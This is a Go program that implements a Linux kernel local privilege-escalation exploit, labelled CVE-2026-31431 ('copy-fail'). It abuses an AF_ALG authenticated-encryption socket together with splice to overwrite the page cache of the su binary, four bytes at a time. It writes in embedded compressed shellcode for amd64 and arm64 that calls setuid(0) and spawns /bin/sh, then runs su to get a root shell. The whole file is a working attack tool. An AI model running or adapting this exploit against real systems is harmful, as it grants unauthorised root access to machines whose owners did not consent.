//go:build linux
// +build linux

package main

import (
	"bytes"
	"compress/zlib"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	// Cryptographic API Socket Constants
	SOL_ALG               = 279
	ALG_SET_KEY           = 1
	ALG_SET_IV            = 2
	ALG_SET_OP            = 3
	ALG_SET_AEAD_ASSOCLEN = 4
	ALG_SET_AEAD_AUTHSIZE = 5
)

// packCmsg constructs a raw Control Message (CMSG) buffer to be sent alongside the payload
func packCmsg(level, typ int, data []byte) []byte {
	cmsgSpace := unix.CmsgSpace(len(data))
	b := make([]byte, cmsgSpace)
	h := (*unix.Cmsghdr)(unsafe.Pointer(&b[0]))
	h.Level = int32(level)
	h.Type = int32(typ)
	h.SetLen(unix.CmsgLen(len(data)))
	copy(b[unix.CmsgLen(0):], data)
	return b
}

// c is the core vulnerability trigger function, replacing 4 bytes of the target file's page cache
func c(f *os.File, t int, cData []byte) {
	// 1. Create AF_ALG cryptographic socket
	fd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
	if err != nil {
		log.Fatalf("Socket creation failed: %v", err)
	}
	defer unix.Close(fd)

	// 2. Bind it to the vulnerable Authenticated Encryption wrapper
	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}
	if err := unix.Bind(fd, sa); err != nil {
		log.Fatalf("Socket Bind failed: %v", err)
	}

	// 3. Setup dummy key and auth sizes
	keyHex := "0800010000000010" + strings.Repeat("0", 64)
	keyBytes, _ := hex.DecodeString(keyHex)

	if err := unix.SetsockoptString(fd, SOL_ALG, ALG_SET_KEY, string(keyBytes)); err != nil {
		log.Fatalf("Setsockopt(key) failed: %v", err)
	}
	if err := unix.SetsockoptInt(fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 4); err != nil {
		log.Fatalf("Setsockopt(authsize) failed: %v", err)
	}

	// 4. Accept a new operational socket connection.
	// AF_ALG requires accept(2) with NULL addr/addrlen; unix.Accept passes
	// non-NULL pointers and the kernel returns ECONNABORTED. See SockaddrALG
	// docs in golang.org/x/sys/unix.
	uFdRaw, _, errno := unix.Syscall6(unix.SYS_ACCEPT4, uintptr(fd), 0, 0, 0, 0, 0)
	if errno != 0 {
		log.Fatalf("Accept failed: %v", errno)
	}
	uFd := int(uFdRaw)
	defer unix.Close(uFd)

	// 5. Build Control Messages (CMSG)
	var oob []byte
	oob = append(oob, packCmsg(SOL_ALG, ALG_SET_OP, []byte{0, 0, 0, 0})...)                        // ALG_SET_OP (Decrypt)
	oob = append(oob, packCmsg(SOL_ALG, ALG_SET_IV, append([]byte{0x10}, make([]byte, 19)...))...) // ALG_SET_IV (20 bytes)
	oob = append(oob, packCmsg(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, []byte{8, 0, 0, 0})...)             // ALG_SET_AEAD_ASSOCLEN

	// 6. Send payload payload out-of-band configuring encryption state
	msgData := append([]byte("AAAA"), cData...)
	err = unix.Sendmsg(uFd, msgData, oob, nil, unix.MSG_MORE)
	if err != nil {
		log.Fatalf("Sendmsg failed: %v", err)
	}

	// 7. Setup standard pipes for the splice
	var p [2]int
	if err := unix.Pipe(p[:]); err != nil {
		log.Fatalf("Pipe creation failed: %v", err)
	}
	defer unix.Close(p[0])
	defer unix.Close(p[1])

	// 8. Splice magic (Moves read-only page cache refs into the pipe -> then to the crypto socket)
	o := t + 4
	offset := int64(0)

	// Splice from the target file into the pipe
	_, err = unix.Splice(int(f.Fd()), &offset, p[1], nil, o, 0)
	if err != nil {
		log.Fatalf("Splice (File->Pipe) failed: %v", err)
	}

	// Splice from the pipe into the active crypto socket
	_, err = unix.Splice(p[0], nil, uFd, nil, o, 0)
	if err != nil {
		log.Fatalf("Splice (Pipe->Socket) failed: %v", err)
	}

	// 9. Consume response, triggering the memory-overwrite condition
	buf := make([]byte, 8+t)
	unix.Read(uFd, buf)
}

func decompressPayload(zlibBytes []byte) []byte {
	r, err := zlib.NewReader(bytes.NewReader(zlibBytes))
	if err != nil {
		log.Fatalf("Zlib decompression failed: %v", err)
	}
	payload, err := io.ReadAll(r)
	r.Close()
	if err != nil {
		log.Fatalf("Read zlib payload: %v", err)
	}
	return payload
}

func printHelp() {
	prog := os.Args[0]
	fmt.Fprintf(os.Stderr, "Usage: %s [-h|--help]\n\n", prog)
	fmt.Fprintf(os.Stderr, "Go implementation of CVE-2026-31431 (copy-fail).\n")
	fmt.Fprintf(os.Stderr, "Overwrites the page cache of su and runs su.\n")
	fmt.Fprintf(os.Stderr, "See https://copy.fail for for information.\n")
}

// Minimal static ELF that calls setuid(0); execve("/bin/sh", NULL, NULL); exit(0).
// One per supported architecture, zlib-compressed for compactness.
//
// x86_64 ELF (160 bytes) - shellcode at file offset 0x78:
//   31 c0           xor    eax, eax
//   31 ff           xor    edi, edi
//   b0 69           mov    al, 0x69        ; SYS_setuid
//   0f 05           syscall
//   48 8d 3d 0f..   lea    rdi, [rip+0xf]  ; "/bin/sh"
//   31 f6           xor    esi, esi
//   6a 3b 58        push 0x3b; pop rax     ; SYS_execve
//   99              cdq                    ; rdx = 0
//   0f 05           syscall
//   31 ff           xor    edi, edi
//   6a 3c 58        push 0x3c; pop rax     ; SYS_exit
//   0f 05           syscall
//
// aarch64 ELF (172 bytes) - shellcode at file offset 0x78:
//   d2800000        mov  x0, #0
//   d2801248        mov  x8, #146          ; SYS_setuid
//   d4000001        svc  #0
//   10000100        adr  x0, sh
//   d2800001        mov  x1, #0
//   d2800002        mov  x2, #0
//   d2801ba8        mov  x8, #221          ; SYS_execve
//   d4000001        svc  #0
//   d2800000        mov  x0, #0
//   d2800ba8        mov  x8, #93           ; SYS_exit
//   d4000001        svc  #0
//   "/bin/sh\0"
var payloadsZlibHex = map[string]string{
	"amd64": "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3",
	"arm64": "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578",
}

// resolveSu returns the path to the su binary. It prefers /usr/bin/su when
// present; otherwise it walks PATH (via exec.LookPath, equivalent to which(1)).
func resolveSu() (string, error) {
	const fallback = "/usr/bin/su"
	if _, err := os.Stat(fallback); err == nil {
		return fallback, nil
	}
	p, err := exec.LookPath("su")
	if err != nil {
		return "", fmt.Errorf("su not found in PATH and not at %s: %w", fallback, err)
	}
	return p, nil
}

func main() {
	for _, arg := range os.Args[1:] {
		switch arg {
		case "-h", "--help", "-help":
			printHelp()
			os.Exit(0)
		}
	}

	// Pick payload for the running architecture. The amd64 ELF is the
	// original from https://github.com/theori-io/copy-fail-CVE-2026-31431;
	// the arm64 ELF is an equivalent reconstructed from scratch (see the
	// payloadsZlibHex doc comment for shellcode disassembly).
	payloadHex, ok := payloadsZlibHex[runtime.GOARCH]
	if !ok {
		log.Fatalf("Unsupported architecture: %s (need amd64 or arm64)", runtime.GOARCH)
	}
	payloadZlib, err := hex.DecodeString(payloadHex)
	if err != nil {
		log.Fatalf("Invalid hex payload: %v", err)
	}
	payload := decompressPayload(payloadZlib)

	suPath, err := resolveSu()
	if err != nil {
		log.Fatalf("%v", err)
	}

	// Open target file in read-only mode
	f, err := os.Open(suPath)
	if err != nil {
		log.Fatalf("Failed to open target file: %v", err)
	}
	defer f.Close()

	// Iteratively overwrite the page cache of the file, 4 bytes at a time
	log.Printf("Overwriting page cache of %s with %d bytes", f.Name(), len(payload))
	for i := 0; i < len(payload); i += 4 {
		end := i + 4
		if end > len(payload) {
			end = len(payload)
		}
		c(f, i, payload[i:end])
		if len(payload) < 10000 {
			if i%100 == 0 {
				log.Printf("  ... wrote %d bytes", i+4)
			}
		} else {
			if i%10000 == 0 {
				log.Printf("  ... wrote %d bytes", i+4)
			}
		}
	}
	log.Printf("  ... wrote %d bytes", len(payload))

	// Execute the now-overwritten binary to trigger privilege escalation
	log.Println("Executing payload")
	var cmd *exec.Cmd
	cmd = exec.Command("su")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		log.Fatalf("Failed to execute payload: %v", err)
	}
}
